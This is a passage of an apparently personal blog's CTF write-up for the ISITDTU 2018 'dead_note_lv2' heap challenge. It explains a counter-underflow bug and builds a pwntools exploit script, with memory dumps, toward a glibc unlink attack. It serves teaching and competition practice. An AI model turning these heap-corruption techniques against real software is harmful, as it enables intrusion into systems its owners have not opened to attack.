@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>ISITDTU CTF 2018 Quals - dead_note_lv2 | kileak</title>
+
+
+
+
+
+<meta name="description" content="ISITDTU CTF 2018 Quals - dead_note_lv2">
+
+
+<meta name="keywords" content="isitdtu">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2018/isitdtu-deadnote2/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">ISITDTU CTF 2018 Quals - dead_note_lv2</h1>
+      <p class="post-meta">Jul 27, 2018</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>ISITDTU CTF 2018 Quals - dead_note_lv2
+<!--break--></p>
+
+  <p>7 Solves</p>
+
+  <p>nc 206.189.46.173 50200</p>
+
+  <p>Link Binary: https://bit.ly/2K4D3qE</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/deadnote2/dead_note_lv2">dead_note_lv2</a> <a href="https://kileak.github.io/assets/deadnote2/libc.so.6">libc.so.6</a> <a href="https://kileak.github.io/assets/deadnote2/xpl.py">xpl.py</a></p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">***************************************
+*                                     *
+* 1 - Add                             *
+* 2 - Edit                            *
+* 3 - Del                             *
+* 4 - Exit                            *
+*                                     *
+***************************************
+Your choice: </code></pre></figure>
+
+<p>Though it’s the second level, the approach now is completely different.</p>
+
+<p>Binary sections aren’t marked <code class="language-plaintext highlighter-rouge">rwx</code> anymore, but this time we’re allowed to create and edit bigger chunks. This looks way more like your proper heap challenge.</p>
+
+<p>So, let’s check the differences in the code:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">add_note</span><span class="p">()</span>
+<span class="p">{</span>  
+  <span class="k">for</span> <span class="p">(</span> <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">10</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">NOTE_TABLE</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">)</span> <span class="p">{</span>
+      <span class="kt">char</span> <span class="o">*</span><span class="n">chunk</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">);</span>
+
+      <span class="n">printf</span><span class="p">(</span><span class="s">"Content: "</span><span class="p">);</span>
+      <span class="n">read_string</span><span class="p">(</span><span class="n">chunk</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">);</span>
+
+      <span class="n">NOTE_TABLE</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">chunk</span><span class="p">;</span>
+      <span class="o">++</span><span class="n">NOTE_COUNT</span><span class="p">;</span>
+
+      <span class="n">puts</span><span class="p">(</span><span class="s">"Done~"</span><span class="p">);</span>
+      <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>  
+<span class="p">}</span></code></pre></figure>
+
+<p>Nothing special here, <code class="language-plaintext highlighter-rouge">add_note</code> will check, if there’s a free entry in the <code class="language-plaintext highlighter-rouge">NOTE_TABLE</code> (max 11 entries), allocate a chunk and put it there, also increasing <code class="language-plaintext highlighter-rouge">NOTE_COUNT</code>.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">delete_note</span><span class="p">()</span>
+<span class="p">{</span>  
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Index: "</span><span class="p">);</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">idx</span> <span class="o">=</span> <span class="n">read_number</span><span class="p">();</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&gt;</span> <span class="mi">10</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"Out of bound~"</span><span class="p">);</span>
+
+  <span class="n">free</span><span class="p">(</span><span class="n">NOTE_TABLE</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span>
+  <span class="n">NOTE_TABLE</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+  <span class="k">return</span> <span class="n">NOTE_COUNT</span><span class="o">--</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">delete_note</code> will this time do a proper boundary check, but it fails to check, if we specified an existing note. Thus, if we give it an index of an unitialized note, it will call <code class="language-plaintext highlighter-rouge">free(0)</code>, which will just do nothing, but decreases <code class="language-plaintext highlighter-rouge">NOTE_COUNT</code> afterwards, which enables us to decrease <code class="language-plaintext highlighter-rouge">NOTE_COUNT</code> by an arbitrary value, by just calling <code class="language-plaintext highlighter-rouge">delete_note</code> on a freed note multiple times. Might remember this for later ;)</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">edit_note</span><span class="p">()</span>
+<span class="p">{</span>  
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Index: "</span><span class="p">);</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">idx</span> <span class="o">=</span> <span class="n">read_number</span><span class="p">();</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&gt;</span> <span class="mi">10</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"Out of bound~"</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">NOTE_TABLE</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"None NOTE~"</span><span class="p">);</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Content: "</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">read_string</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">NOTE_TABLE</span><span class="p">[</span><span class="n">idx</span><span class="p">],</span> <span class="mh">0x88</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>No real bugs here, <code class="language-plaintext highlighter-rouge">edit_note</code> checks the index and also if we specified a note that actually contains content.</p>
+
+<p>So, how to go on with this? Well, for this, we should take a closer look at the memory handling for the <code class="language-plaintext highlighter-rouge">NOTE_TABLE</code> and <code class="language-plaintext highlighter-rouge">NOTE_COUNT</code>. 
+After adding some notes, it will fill up <code class="language-plaintext highlighter-rouge">NOTE_TABLE</code> with the addresses of our note chunks and increase <code class="language-plaintext highlighter-rouge">NOTE_COUNT</code></p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x6020e0: 0x0000000000603010  0x00000000006030a0 &lt;= Note 0 / Note 1
+0x6020f0: 0x0000000000000000  0x0000000000000000 &lt;= Note 2 / Note 3
+0x602100: 0x0000000000000000  0x0000000000000000 &lt;= Note 4 / Note 5
+0x602110: 0x0000000000000000  0x0000000000000000 &lt;= Note 6 / Note 7
+0x602120: 0x0000000000000000  0x0000000000000000 &lt;= Note 8 / Note 9
+0x602130: 0x0000000000000002  0x0000000000000000 &lt;= NOTE_COUNT (Note 10)
+0x602140: 0x0000000000000000  0x0000000000000000</code></pre></figure>
+
+<p>Uhm, the binary allows us to allocate and edit 10 notes, but the address for the 10th chunk is also the <code class="language-plaintext highlighter-rouge">NOTE_COUNT</code> itself. We should surely be able to do some mischief with that :)</p>
+
+<p>Remember, that we are able to decrease <code class="language-plaintext highlighter-rouge">NOTE_COUNT</code> by arbitrary values by freeing an empty chunk, so we can use that to manipulate the address of the 10th chunk.</p>
+
+<p>Let’s set up some chunks to start with:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"206.189.46.173"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">50200</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"Content: "</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"choice: "</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Index: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Content: "</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"choice: "</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Index: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"choice: "</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"choice: "</span><span class="p">)</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Create initial notes"</span><span class="p">)</span>
+
+  <span class="n">add</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># 0
+</span>  <span class="n">add</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># 1
+</span>  <span class="n">add</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># 2
+</span>  <span class="n">add</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># 3
+</span>  <span class="n">add</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># 4
+</span>  <span class="n">add</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># 5
+</span>  <span class="n">add</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># 6
+</span>  <span class="n">add</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># 7
+</span>  <span class="n">add</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># 8
+</span>  <span class="n">add</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># 9
+</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+  <span class="k">return</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+  <span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./dead_note_lv2"</span><span class="p">)</span>
+  <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+
+  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">False</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+    <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+  <span class="k">else</span><span class="p">:</span>
+    <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./dead_note_lv2"</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">"LD_PRELOAD"</span> <span class="p">:</span> <span class="s">"./libc.so.6"</span><span class="p">})</span>
+    <span class="k">print</span> <span class="n">util</span><span class="p">.</span><span class="n">proc</span><span class="p">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+    <span class="n">pause</span><span class="p">()</span>
+    <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span></code></pre></figure>
+
+<p>The <code class="language-plaintext highlighter-rouge">NOTE_TABLE</code> will now look like this</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x6020e0: 0x0000000000603010  0x00000000006030a0 &lt;= Note 0 / 1
+0x6020f0: 0x0000000000603130  0x00000000006031c0 &lt;= Note 2 / 3
+0x602100: 0x0000000000603250  0x00000000006032e0 &lt;= Note 4 / 5
+0x602110: 0x0000000000603370  0x0000000000603400 &lt;= Note 6 / 7
+0x602120: 0x0000000000603490  0x0000000000603520 &lt;= Note 8 / 9
+0x602130: 0x000000000000000a  0x0000000000000000 &lt;= NOTE_COUNT (Note 10)</code></pre></figure>
+
+<p>Since the address at <code class="language-plaintext highlighter-rouge">0x602130</code> is <code class="language-plaintext highlighter-rouge">!= 0x0</code>, <code class="language-plaintext highlighter-rouge">add_note</code> won’t allow us to create another note and complains with <code class="language-plaintext highlighter-rouge">FULL~~</code>.</p>
+
+<p>Well, we can change this with abusing <code class="language-plaintext highlighter-rouge">delete_note</code></p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Call delete to get note counter to -1"</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">11</span><span class="p">):</span>
+  <span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span></code></pre></figure>
+
+<p>This will decrease <code class="language-plaintext highlighter-rouge">NOTE_COUNT</code> until it’s <code class="language-plaintext highlighter-rouge">-1</code>. We need to be able to create another chunk, which will be stored in <code class="language-plaintext highlighter-rouge">Note 1</code> before being able to create another chunk in <code class="language-plaintext highlighter-rouge">Note 10</code>, which will increase <code class="language-plaintext highlighter-rouge">NOTE_COUNT</code> by 1, resulting in a <code class="language-plaintext highlighter-rouge">0x0</code> in <code class="language-plaintext highlighter-rouge">0x602130</code>.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x6020e0: 0x0000000000603010  0x0000000000000000
+0x6020f0: 0x0000000000603130  0x00000000006031c0
+0x602100: 0x0000000000603250  0x00000000006032e0
+0x602110: 0x0000000000603370  0x0000000000603400
+0x602120: 0x0000000000603490  0x0000000000603520
+0x602130: 0x00000000ffffffff  0x0000000000000000</code></pre></figure>
+
+<p>Now we create two new chunks</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Create chunk to fill 1"</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="s">"B"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Create chunk in NOTE_COUNT"</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="s">"C"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x6020e0: 0x0000000000603010  0x00000000006030a0
+0x6020f0: 0x0000000000603130  0x00000000006031c0
+0x602100: 0x0000000000603250  0x00000000006032e0
+0x602110: 0x0000000000603370  0x0000000000603400
+0x602120: 0x0000000000603490  0x0000000000603520
+0x602130: 0x0000000000000000  0x0000000000000000
+
+...
+
+0x6020e0: 0x0000000000603010  0x00000000006030a0
+0x6020f0: 0x0000000000603130  0x00000000006031c0
+0x602100: 0x0000000000603250  0x00000000006032e0
+0x602110: 0x0000000000603370  0x0000000000603400
+0x602120: 0x0000000000603490  0x0000000000603520
+0x602130: 0x00000000006035b1  0x0000000000000000 &lt;= NOTE_COUNT (Note 10)</code></pre></figure>
+
+<p>We now have a note in the NOTE_COUNT address (see, how the address also got increased by 1 after adding it…).</p>
+
+<p>And like before, we’re able to move the address around in the heap by multiple calls to <code class="language-plaintext highlighter-rouge">delete_note</code> and since it’s a valid note, we can use <code class="language-plaintext highlighter-rouge">edit_note</code>, giving us an arbitrary write on the heap.</p>
+
+<p>Though, there’s nothing of interest inside the heap, we would like to have a note pointer pointing somewhere useful, like the <code class="language-plaintext highlighter-rouge">bss</code>…</p>
+
+<p>Since no <code class="language-plaintext highlighter-rouge">PIE</code> is enabled, we know the address of <code class="language-plaintext highlighter-rouge">NOTETABLE</code>, which conveniently contains pointers to our chunks, so we can do an <code class="language-plaintext highlighter-rouge">unlink</code> attack to write the address of <code class="language-plaintext highlighter-rouge">NOTETABLE</code> into itself.</p>
+
+<p>Though, some preparations for this needs to be taken.</p>
+
+<ul>
+  <li>Create a fake chunk on the heap containing <code class="language-plaintext highlighter-rouge">FD</code>/<code class="language-plaintext highlighter-rouge">BK</code> pointers to <code class="language-plaintext highlighter-rouge">NOTETABLE</code> (which needs to point back to our fake chunk to get around the libc checks)</li>
+  <li>Overwrite <code class="language-plaintext highlighter-rouge">prev_size</code> and <code class="language-plaintext highlighter-rouge">size</code> of a followup chunk, so that upon freeing the followup, <code class="language-plaintext highlighter-rouge">free</code> will think the previous chunk is also free
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">prev_size</code> should be forged, so that it points to our fake chunk</li>
+    </ul>
+  </li>
+  <li>Free the manipulated chunk, which will then unlink our fake chunk</li>
+  <li>With the overwritten note entry, we can now modify the <code class="language-plaintext highlighter-rouge">NOTETABLE</code> itself resulting in an arbitrary write</li>
+</ul>
+
+<p>For this, we’ll change the note initialization a bit</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">add</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># 0
+</span><span class="n">add</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># 1
+</span><span class="n">add</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># 2
+</span><span class="n">add</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># 3
+</span><span class="n">add</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># 4
+</span><span class="n">add</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># 5
+</span><span class="n">add</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># 6
+</span><span class="n">add</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># 7
+</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Prepare fake chunk for unlink"</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x121</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x602120</span><span class="o">-</span><span class="mh">0x18</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x602120</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x70</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+
+<span class="n">add</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="c1"># 8
+</span>
+<span class="n">add</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># 9
+</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Call delete to get note counter to -1"</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">11</span><span class="p">):</span>
+  <span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Create chunk to fill 1"</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="s">"B"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1">#1
+</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Create chunk in NOTE_COUNT"</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x120</span><span class="p">))</span> <span class="c1"># 10 (containing prev_size pointing to fake chunk)</span></code></pre></figure>
+
+<p>We prepare our fake chunk in chunk 8 (size <code class="language-plaintext highlighter-rouge">0x120</code>) with <code class="language-plaintext highlighter-rouge">FD</code>/<code class="language-plaintext highlighter-rouge">BK</code> pointing to the <code class="language-plaintext highlighter-rouge">NOTETABLE</code> entry for chunk 8 (which happens to point to the data portion of note 8, which is our fake chunk).</p>
+
+<p>In our final <code class="language-plaintext highlighter-rouge">NOTE_COUNT</code> chunk we store a valid <code class="language-plaintext highlighter-rouge">prev_size</code>, which points to the fake chunk, we created in chunk 8.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">NOTE_TABLE
+
+0x6020e0: 0x0000000000603010  0x00000000006030a0
+0x6020f0: 0x0000000000603130  0x00000000006031c0
+0x602100: 0x0000000000603250  0x00000000006032e0
+0x602110: 0x0000000000603370  0x0000000000603400
+0x602120: 0x0000000000603490  0x0000000000603520 &lt;= Note 8
+0x602130: 0x00000000006035b1  0x0000000000000000 &lt;= NOTE_COUNT (Note 10)
+
+HEAP
+
+0x603480: 0x0000000000000000  0x0000000000000091 &lt;= Note 8
+0x603490: 0x0000000000000000  0x0000000000000121 &lt;= Fake chunk (size 0x120)
+0x6034a0: 0x0000000000602108  0x0000000000602110 &lt;= Fake FD/BK
+0x6034b0: 0x4141414141414141  0x4141414141414141
+0x6034c0: 0x4141414141414141  0x4141414141414141
+0x6034d0: 0x4141414141414141  0x4141414141414141
+0x6034e0: 0x4141414141414141  0x4141414141414141
+0x6034f0: 0x4141414141414141  0x4141414141414141
+0x603500: 0x0000000000000000  0x0000000000000000
+0x603510: 0x0000000000000000  0x0000000000000091 &lt;= Note 9
+0x603520: 0x4141414141414141  0x0000000000000000
+0x603530: 0x0000000000000000  0x0000000000000000
+0x603540: 0x0000000000000000  0x0000000000000000
+0x603550: 0x0000000000000000  0x0000000000000000
+0x603560: 0x0000000000000000  0x0000000000000000
+0x603570: 0x0000000000000000  0x0000000000000000
+0x603580: 0x0000000000000000  0x0000000000000000
+0x603590: 0x0000000000000000  0x0000000000000000
+0x6035a0: 0x0000000000000000  0x0000000000000091 &lt;= Note 10
+0x6035b0: 0x0000000000000120  0x0000000000000000 &lt;= prev_size for Fake_chunk</code></pre></figure>
+
+<p>We still need to overwrite <code class="language-plaintext highlighter-rouge">prev_size</code> for <code class="language-plaintext highlighter-rouge">Note 9</code> and toggle the <code class="language-plaintext highlighter-rouge">prev_inuse</code> bit of <code class="language-plaintext highlighter-rouge">Note 9</code>, so <code class="language-plaintext highlighter-rouge">free</code> will think that the previous chunk is also freed.</p>
+
+<p>Now is the time, for <code class="language-plaintext highlighter-rouge">NOTE_COUNT</code> to shine :). We’ll be freeing so many notes, decreasing <code class="language-plaintext highlighter-rouge">NOTE_COUNT</code> (and the address of <code class="language-plaintext highlighter-rouge">Note 10</code>) until <code class="language-plaintext highlighter-rouge">Note 10</code> points to <code class="language-plaintext highlighter-rouge">0x603510</code>.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Move NOTE_COUNT to prev_size of chunk 9"</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0xa1</span><span class="p">):</span>
+  <span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x6020e0: 0x0000000000603010  0x0000000000000000
+0x6020f0: 0x0000000000603130  0x00000000006031c0
+0x602100: 0x0000000000603250  0x00000000006032e0
+0x602110: 0x0000000000603370  0x0000000000603400
+0x602120: 0x0000000000603490  0x0000000000603520
+0x602130: 0x0000000000603510  0x0000000000000000 &lt;= Note 10 </code></pre></figure>
+
+<p>Now we can overwrite <code class="language-plaintext highlighter-rouge">prev_size</code> and <code class="language-plaintext highlighter-rouge">size</code> of <code class="language-plaintext highlighter-rouge">Note 9</code> via <code class="language-plaintext highlighter-rouge">Note 10</code> and trigger <code class="language-plaintext highlighter-rouge">unlink</code> by deleting <code class="language-plaintext highlighter-rouge">Note 9</code></p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Overwrite prev_size and size"</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x90</span><span class="p">))</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Trigger unlink by freeing chunk 9 (chunk 8 points to bss now (=&gt;chunk 5))"</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span></code></pre></figure>
+
